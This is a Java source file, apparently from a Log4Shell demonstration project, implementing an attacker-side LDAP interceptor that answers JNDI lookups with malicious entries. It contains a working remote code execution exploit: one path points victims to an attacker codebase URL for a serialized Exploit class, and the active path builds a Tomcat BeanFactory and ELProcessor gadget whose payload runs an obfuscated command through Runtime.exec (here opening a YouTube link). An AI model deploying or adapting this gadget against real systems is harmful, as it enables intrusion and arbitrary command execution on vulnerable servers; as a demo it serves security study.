package com.demo.exploit.log4jshell.attacker.server.ldap;

import com.demo.exploit.log4jshell.attacker.payload.Exploit;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.io.*;
import java.net.URL;
import java.util.ArrayList;

/**
 * LDAP operation interceptor will intercept all the results that the In Memory LDAP server returns and amends the response before it is sent to Victims Computer/Machine(VM/POD)
 *
 * @author karanratra on 12/20/21
 */

public class AttackerLDAPOperationInterceptor extends InMemoryOperationInterceptor {

    private URL httpServerURL;

    public AttackerLDAPOperationInterceptor(URL cb) {
        this.httpServerURL = cb;
    }


    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        Entry e = new Entry(base);
        try {
            sendResult(result, base, e);
        } catch (Exception e1) {
            e1.printStackTrace();
        }

    }

    protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, IOException {
        //URL turl = new URL(this.httpServerURL, this.httpServerURL.getRef().replace('.', '/').concat(".class"));

        System.out.println("[+] [LDAP server log] Send LDAP reference result for " + base + " redirecting to " + this.httpServerURL);

        String baseURL = this.httpServerURL.toString();

        int refPos = baseURL.indexOf('#');

        if (refPos > 0) {
            baseURL = baseURL.substring(0, refPos);
        }

        //baseURL = "http://localhost:65535/Exploit.class";

        //Attacker can use either Option #1 or Option #2 to exploit JNDI Injection and do Remote Code Execution(RCE) on Victim's machine
        //For demo purpose you can use comment either one option and test this code

        //Option 1 : JavaSerializationObject
        //javaSerializedObjectLDAPInjection(e, baseURL);

        //Option 2 : JavaNamingReference
        javaNamingReferenceLDAPInjection(e);


        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    private void javaSerializedObjectLDAPInjection(Entry e, String baseURL) throws IOException {
        //Injection using JavaSerializationObject
        Object obj = new Exploit();
        e.addAttribute("javaSerializedData", serialize(obj));
        // e.addAttribute("javaSerializedData", serialize(new ObjectPayloadSerializable("com.demo.exploit.log4jshell.Exploit2")));
        e.addAttribute("javaClassName", obj.getClass().getName());
        //e.addAttribute("javaCodeBase", "http://localhost:65535/");
        e.addAttribute("javaCodeBase", baseURL);
    }

    private void javaNamingReferenceLDAPInjection(Entry e) throws IOException {

        /*

        Object obj = new Exploit2();
        e.addAttribute("objectClass", "javaNamingReference");
        e.addAttribute("javaClassName",obj.getClass().getName());
        //e.addAttribute("javaFactory", "com.demo.exploit.log4jshell.Exploit");
        e.addAttribute("javaFactory", this.codebase.getRef());
        e.addAttribute("javaCodeBase", "http://localhost:65535/");
        //e.addAttribute("objectClass", "Exploit");
*/

        //Injection using JavaNamingReference using Tomcat Object Factory

        //String command = "/Applications/Atom.app/Contents/MacOS/Atom";
        String command = "open https://www.youtube.com/watch?v=YkADj0TPrJA";
        String payload = ("{" +
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
                "}")
                .replace("${command}", makeJavaScriptString(command));
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", payload));
        e.addAttribute("javaSerializedData", serialize(ref));
    }

    public static String makeJavaScriptString(String str) {

        ArrayList<String> result = new ArrayList<>(str.length());
        for(int i=0; i<str.length(); i++) {
            Integer x = Character.codePointAt(str, i);
            result.add(x.toString());
        }
        return "String.fromCharCode(" + String.join(",", result) + ")";
    }

    private  byte[] serialize(Object ref) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);
        return out.toByteArray();
    }
}